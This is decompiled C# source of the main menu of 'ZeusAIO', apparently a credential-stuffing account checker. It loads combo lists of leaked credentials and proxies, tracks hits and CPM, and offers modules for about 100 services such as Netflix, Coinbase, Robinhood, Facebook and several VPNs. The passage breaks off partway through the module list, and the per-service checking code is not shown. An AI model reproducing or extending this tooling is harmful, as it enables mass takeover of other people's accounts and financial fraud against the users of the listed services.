// Decompiled with JetBrains decompiler
// Type: ZeusAIO.mainmenu
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using DiscordRPC;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;

namespace ZeusAIO
{
  internal class mainmenu
  {
    private static List<Func<string[], string, bool>> pickedModules = new List<Func<string[], string, bool>>();
    public static List<string> pickedModulesNames = new List<string>();
    public static string options = "";
    public static int globalThreads = -1;
    public static int globalRetries = -1;
    public static string proxyProtocol = "";
    public static int hits = 0;
    public static int frees = 0;
    public static int errors = 0;
    public static int cpm = 0;
    public static int checks = 0;
    public static IEnumerable<string> combos;
    public static int comboTotal = 0;
    public static IEnumerable<string> proxies;
    public static int proxiesCount = 0;
    public static int comboIndex = 0;
    public static int Modules = 0;
    public static string p1 = "";
    public static string pa = "";
    private static DiscordRpcClient client;

    public static void menu()
    {
      Export.Initialize();
      string path = "config.json";
      Config.config = File.Exists(path) ? JsonConvert.DeserializeObject<Config.configObject>(File.ReadAllText(path)) : Config.renewconfig(true);
      new Thread(new ThreadStart(Login.BotShits)).Start();
      Colorful.Console.Clear();
      Write.ascii();
      Colorful.Console.Write("[", Color.Lavender);
      Colorful.Console.Write("1", Color.LawnGreen);
      Colorful.Console.Write("]", Color.Lavender);
      Colorful.Console.Write(" Modules\n", Color.White);
      Colorful.Console.Write("[", Color.Lavender);
      Colorful.Console.Write("2", Color.LawnGreen);
      Colorful.Console.Write("]", Color.Lavender);
      Colorful.Console.Write(" Combo Editer\n", Color.White);
      Colorful.Console.Write("[", Color.Lavender);
      Colorful.Console.Write("3", Color.LawnGreen);
      Colorful.Console.Write("]", Color.Lavender);
      Colorful.Console.Write(" Other tools\n", Color.White);
      Colorful.Console.Write("[", Color.Lavender);
      Colorful.Console.Write("4", Color.LawnGreen);
      Colorful.Console.Write("]", Color.Lavender);
      Colorful.Console.Write(" Settings\n", Color.White);
      Colorful.Console.Write("[", Color.Lavender);
      Colorful.Console.Write("5", Color.LawnGreen);
      Colorful.Console.Write("]", Color.Lavender);
      Colorful.Console.Write(" Exit\n", Color.White);
      string str = Colorful.Console.ReadLine();
      if (str == "1")
      {
        mainmenu.p1 = Config.config.LogorCui;
        mainmenu.Checkingoptions();
      }
      else if (str == "2")
        Comboediter.menu();
      else if (str == "3")
        Proxytools.menu();
      else if (str == "4")
        mainmenu.ChooseUI();
      else if (str == "5")
      {
        Colorful.Console.WriteLine(">> Oh shit, we are closing, bye loser", Color.Magenta);
        Thread.Sleep(1000);
        Environment.Exit(0);
      }
      else
        mainmenu.menu();
    }

    public static void ChooseUI()
    {
      Colorful.Console.Clear();
      Write.ascii();
      Colorful.Console.Write("[", Color.NavajoWhite);
      Colorful.Console.Write("1", Color.LawnGreen);
      Colorful.Console.Write("]", Color.NavajoWhite);
      Colorful.Console.Write(" Settings", Color.White);
      Colorful.Console.WriteLine();
      Colorful.Console.Write("[", Color.NavajoWhite);
      Colorful.Console.Write("2", Color.LawnGreen);
      Colorful.Console.Write("]", Color.NavajoWhite);
      Colorful.Console.Write(" Current Settings", Color.White);
      Colorful.Console.Write("\n[", Color.NavajoWhite);
      Colorful.Console.Write("3", Color.LawnGreen);
      Colorful.Console.Write("]", Color.NavajoWhite);
      Colorful.Console.Write(" Back", Color.White);
      Colorful.Console.WriteLine();
      while (!Colorful.Console.KeyAvailable)
      {
        ConsoleKeyInfo consoleKeyInfo = Colorful.Console.ReadKey();
        if (consoleKeyInfo.Key == ConsoleKey.D1)
          Config.renewconfig(true);
        else if (consoleKeyInfo.Key == ConsoleKey.D3)
          mainmenu.menu();
        else if (consoleKeyInfo.Key == ConsoleKey.D2)
          mainmenu.currentsettings();
        else
          mainmenu.ChooseUI();
      }
    }

    public static void currentsettings()
    {
      Colorful.Console.Clear();
      Write.ascii();
      try
      {
        Colorful.Console.Write(">> Discord ID [For Bot]: ", Color.WhiteSmoke);
        Colorful.Console.Write(Config.config.DiscordID, Color.LawnGreen);
        Colorful.Console.Write("\n>> Refresh Rate: ", Color.WhiteSmoke);
        Colorful.Console.Write(Config.config.RefreshRate, Color.LawnGreen);
        Colorful.Console.Write("\n>> User Interface: ", Color.WhiteSmoke);
        if (Config.config.LogorCui == "1")
          mainmenu.options = "CUI";
        else if (Config.config.LogorCui == "2")
          mainmenu.options = "LOG";
        Colorful.Console.Write(mainmenu.options, Color.LawnGreen);
        Colorful.Console.Write("\n>> Retries Amount: ", Color.WhiteSmoke);
        Colorful.Console.Write(Config.config.Retries, Color.LawnGreen);
      }
      catch
      {
        Colorful.Console.WriteLine("\n>You have not configured settings!!!", Color.Red);
      }
      Colorful.Console.WriteLine("\n\n>> Press Enter to go back", Color.LawnGreen);
      Colorful.Console.ReadLine();
      mainmenu.ChooseUI();
    }

    public static void Checkingoptions()
    {
      Colorful.Console.Clear();
      Write.ascii();
      Colorful.Console.WriteLine("╔═══════════════════════╦═══════════════════════╦═══════════════════════╦═══════════════════════╦═════════════════════╗", Color.LawnGreen);
      Colorful.Console.WriteLineFormatted("║ [{0}] Netflix           ║ [{1}] McAfee            ║ [{2}] CrunchyRoll       ║ [{3}] Facebook          ║ [{4}] Hulu            ║", Color.White, Color.LawnGreen, (object) "1", (object) "2", (object) "3", (object) "4", (object) "5");
      Colorful.Console.WriteLineFormatted("║ [{0}] Coinbase          ║ [{1}] Zee5              ║ [{2}] Minecraft         ║ [{3}] League of Legends ║ [{4}] Origin         ║", Color.White, Color.LawnGreen, (object) "6", (object) "7", (object) "8", (object) "9", (object) "10");
      Colorful.Console.WriteLineFormatted("║ [{0}] Uplay            ║ [{1}] Valorant         ║ [{2}] Instagram        ║ [{3}] BuffaloWildWings ║ [{4}] Dominos US     ║", Color.White, Color.LawnGreen, (object) "11", (object) "12", (object) "13", (object) "14", (object) "15");
      Colorful.Console.WriteLineFormatted("║ [{0}] ColdStoneCreamery║ [{1}] Slice Life       ║ [{2}] Albertsons       ║ [{3}] NordVPN          ║ [{4}] Hide My Ass    ║", Color.White, Color.LawnGreen, (object) "16", (object) "17", (object) "18", (object) "19", (object) "20");
      Colorful.Console.WriteLineFormatted("║ [{0}] Tunnel Bear      ║ [{1}] X-Vpn            ║ [{2}] VyperVPN         ║ [{3}] TigerVPN         ║ [{4}] Luminati       ║", Color.White, Color.LawnGreen, (object) "21", (object) "22", (object) "23", (object) "24", (object) "25");
      Colorful.Console.WriteLineFormatted("║ [{0}] Fitbit           ║ [{1}] Mail Access      ║ [{2}] Napster          ║ [{3}] GetUpside        ║ [{4}] Abv.bg         ║", Color.White, Color.LawnGreen, (object) "26", (object) "27", (object) "28", (object) "29", (object) "30");
      Colorful.Console.WriteLineFormatted("║ [{0}] Aha.com          ║ [{1}] Aliexpress VM    ║ [{2}] Antipublic       ║ [{3}] Blim.com         ║ [{4}] Coins.ph       ║", Color.White, Color.LawnGreen, (object) "31", (object) "32", (object) "33", (object) "34", (object) "35");
      Colorful.Console.WriteLineFormatted("║ [{0}] DC Universe      ║ [{1}] Duolingo         ║ [{2}] Easyjet          ║ [{3}] Elastic Email    ║ [{4}] Foap           ║", Color.White, Color.LawnGreen, (object) "36", (object) "37", (object) "38", (object) "39", (object) "40");
      Colorful.Console.WriteLineFormatted("║ [{0}] GooseVPN         ║ [{1}] Headspace        ║ [{2}] HolaVPN          ║ [{3}] Wish             ║ [{4}] IbVPN          ║", Color.White, Color.LawnGreen, (object) "41", (object) "42", (object) "43", (object) "44", (object) "45");
      Colorful.Console.WriteLineFormatted("║ [{0}] Imvu             ║ [{1}] Ip Vanish        ║ [{2}] Later.com        ║ [{3}] Mingle.com       ║ [{4}] Mycanal        ║", Color.White, Color.LawnGreen, (object) "46", (object) "47", (object) "48", (object) "49", (object) "50");
      Colorful.Console.WriteLineFormatted("║ [{0}] OutbackSteakHouse║ [{1}] Shawacademy      ║ [{2}] Shemaroo.me      ║ [{3}] Shopify          ║ [{4}] Smartproxy     ║", Color.White, Color.LawnGreen, (object) "51", (object) "52", (object) "53", (object) "54", (object) "55");
      Colorful.Console.WriteLineFormatted("║ [{0}] Smoothie King    ║ [{1}] Surfshark        ║ [{2}] Symbolab         ║ [{3}] Twitch           ║ [{4}] Udacity        ║", Color.White, Color.LawnGreen, (object) "56", (object) "57", (object) "58", (object) "59", (object) "60");
      Colorful.Console.WriteLineFormatted("║ [{0}] Ullu             ║ [{1}] Voot             ║ [{2}] Vortex.gg        ║ [{3}] Waves.com        ║ [{4}] Yahoo          ║", Color.White, Color.LawnGreen, (object) "61", (object) "62", (object) "63", (object) "64", (object) "65");
      Colorful.Console.WriteLineFormatted("║ [{0}] Beeg.com         ║ [{1}] Bitlaunch.io     ║ [{2}] Md5 Dehasher     ║ [{3}] Reddit           ║ [{4}] Steam          ║", Color.White, Color.LawnGreen, (object) "66", (object) "67", (object) "68", (object) "69", (object) "70");
      Colorful.Console.WriteLineFormatted("║ [{0}] Gfuel            ║ [{1}] DoorDash         ║ [{2}] Pornhub          ║ [{3}] Robinhood        ║ [{4}] Patreon.com    ║", Color.White, Color.LawnGreen, (object) "71", (object) "72", (object) "73", (object) "74", (object) "75");
      Colorful.Console.WriteLineFormatted("║ [{0}] Gamefly          ║ [{1}] Gucci            ║ [{2}] Xcams            ║ [{3}] PostMatesFleet   ║ [{4}] Adfly          ║", Color.White, Color.LawnGreen, (object) "76", (object) "77", (object) "78", (object) "79", (object) "80");
      Colorful.Console.WriteLineFormatted("║ [{0}] Ufc              ║ [{1}] Nba              ║ [{2}] Godaddy          ║ [{3}] Scribd           ║ [{4}] Forever21      ║", Color.White, Color.LawnGreen, (object) "81", (object) "82", (object) "83", (object) "84", (object) "85");
      Colorful.Console.WriteLineFormatted("║ [{0}] Apowersoft       ║ [{1}] Avira            ║ [{2}] Wwe              ║ [{3}] Sling TV         ║ [{4}] Fox            ║", Color.White, Color.LawnGreen, (object) "86", (object) "87", (object) "88", (object) "89", (object) "90");
      Colorful.Console.WriteLineFormatted("║ [{0}] Tubi Tv          ║ [{1}] Bitesquad        ║ [{2}] Pizzahut UK VM   ║ [{3}] Twitch Legacy    ║ [{4}] Upcloud        ║", Color.White, Color.LawnGreen, (object) "91", (object) "92", (object) "93", (object) "94", (object) "95");
      Colorful.Console.WriteLineFormatted("║ [{0}] Microsft/Edu MA  ║ [{1}] Fwrd             ║ [{2}] Bagel Boy        ║ [{3}] Word Press       ║ [{4}] Viaplay       ║", Color.White, Color.LawnGreen, (object) "96", (object) "97", (object) "98", (object) "99", (object) "100");
      Colorful.Console.WriteLine("╚═══════════════════════╩═══════════════════════╩═══════════════════════╩═══════════════════════╩═════════════════════╝", Color.LawnGreen);
      Colorful.Console.WriteLine("");
      Colorful.Console.WriteLine(">> Once you actually start checking, will take 10-20 sec for threads to start", Color.Yellow);
      Colorful.Console.WriteLine(">> Pick a number and press enter, after you are satisfied ; press s to start", Color.Magenta);
      Colorful.Console.WriteLine("");
      string str = Colorful.Console.ReadLine();
      if (str == "1")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Netflix");
        Colorful.Console.WriteLine(">> Netflix Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "2")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("McAfee");
        Colorful.Console.WriteLine(">> McAfee Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "3")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("CrunchyRoll");
        Colorful.Console.WriteLine(">> CrunchyRoll Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "4")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Facebook");
        Colorful.Console.WriteLine(">> Facebook Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "5")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Hulu");
        Colorful.Console.WriteLine(">> Hulu Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "6")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Coinbase");
        Colorful.Console.WriteLine(">> Coinbase Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "7")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Zee5");
        Colorful.Console.WriteLine(">> Zee5 Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "8")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Minecraft");
        Colorful.Console.WriteLine(">> Minecraft Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "9")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("LOL[EUW]");
        Colorful.Console.WriteLine(">> LOL Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "10")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Origin");
        Colorful.Console.WriteLine(">> Origin Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "11")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Uplay");
        Colorful.Console.WriteLine(">> Uplay Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "12")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Valorant");
        Colorful.Console.WriteLine(">> Valorant Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "13")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Instagram");
        Colorful.Console.WriteLine(">> Instagram Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "14")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Bww");
        Colorful.Console.WriteLine(">> Buffalo Wild Wings Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "15")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Dominos");
        Colorful.Console.WriteLine(">> Dominos Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "16")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("ColdStone");
        Colorful.Console.WriteLine(">> ColdStone Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "17")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Slicelife");
        Colorful.Console.WriteLine(">> SliceLife Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "18")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Albertsons");
        Colorful.Console.WriteLine(">> Albertsons Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "19")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("NordVpn");
        Colorful.Console.WriteLine(">> NordVpn Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "20")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Hide My Ass");
        Colorful.Console.WriteLine(">> Hide My Ass Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "21")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("TunnelBear");
        Colorful.Console.WriteLine(">> TunnelBear Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "22")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Xvpn");
        Colorful.Console.WriteLine(">> Xvpn Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "23")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("VyperVpn");
        Colorful.Console.WriteLine(">> VyperVpn Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "24")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("TigerVpn");
        Colorful.Console.WriteLine(">> TigerVpn Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "25")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Luminati");
        Colorful.Console.WriteLine(">> Luminati Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "26")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Fitbit");
        Colorful.Console.WriteLine(">> Fitbit Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "27")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("MailAccess");
        Colorful.Console.WriteLine(">> MailAccess Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "28")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Napster");
        Colorful.Console.WriteLine(">> Napster Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "29")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("GetUpSide");
        Colorful.Console.WriteLine(">> GetUpSide Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "30")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Abv.bg");
        Colorful.Console.WriteLine(">> Abv.bg Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "31")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Aha.com");
        Colorful.Console.WriteLine(">> Aha.com Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "32")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Aliexpress [Valid Mail]");
        Colorful.Console.WriteLine(">> Aliexpress [Valid Mail] Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "33")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Antipublic");
        Colorful.Console.WriteLine(">> Antipublic Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "34")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Blim.com");
        Colorful.Console.WriteLine(">> Blim.com Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "35")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Coins.ph");
        Colorful.Console.WriteLine(">> Coins.ph Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "36")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("DC Universe");
        Colorful.Console.WriteLine(">> DC Universe Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "37")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Duolingo");
        Colorful.Console.WriteLine(">> Duolingo Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "38")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Easyjet");
        Colorful.Console.WriteLine(">> Easyjet Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "39")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Elastic email");
        Colorful.Console.WriteLine(">> Elastic email Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "40")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Foap");
        Colorful.Console.WriteLine(">> Foap Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "41")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("GooseVpn");
        Colorful.Console.WriteLine(">> GooseVpn Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "42")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Headspace");
        Colorful.Console.WriteLine(">> Headspace Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "43")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("HolaVpn");
        Colorful.Console.WriteLine(">> HolaVpn Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "44")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Wish");
        Colorful.Console.WriteLine(">> Wish Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "45")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("IbVpn");
        Colorful.Console.WriteLine(">> IbVpn Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "46")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Imvu");
        Colorful.Console.WriteLine(">> Imvu Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "47")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Ip vanish");
        Colorful.Console.WriteLine(">> Ip vanish Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "48")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Later.com");
        Colorful.Console.WriteLine(">> Later.com Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "49")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Mingle.com");
        Colorful.Console.WriteLine(">> Mingle.com Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "50")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("MyCanal");
        Colorful.Console.WriteLine(">> MyCanal Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "51")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Outback SteakHouse");
        Colorful.Console.WriteLine(">> Outback SteakHouse Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "52")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Shawacademy");
        Colorful.Console.WriteLine(">> Shawacademy Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "53")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Shemaroo.me");
        Colorful.Console.WriteLine(">> Shemaroo.me Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "54")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Shopify");
        Colorful.Console.WriteLine(">> Shopify Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "55")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Smartproxy");
        Colorful.Console.WriteLine(">> Smartproxy Module Added...", Color.Magenta);
        Thread.Sleep(500);
        mainmenu.Checkingoptions();
      }
      if (str == "56")
      {
        // ISSUE: method pointer
        mainmenu.pickedModules.Add(new Func<string[], string, bool>((object) null, __methodptr(CheckAccount)));
        mainmenu.pickedModulesNames.Add("Smoothie king");
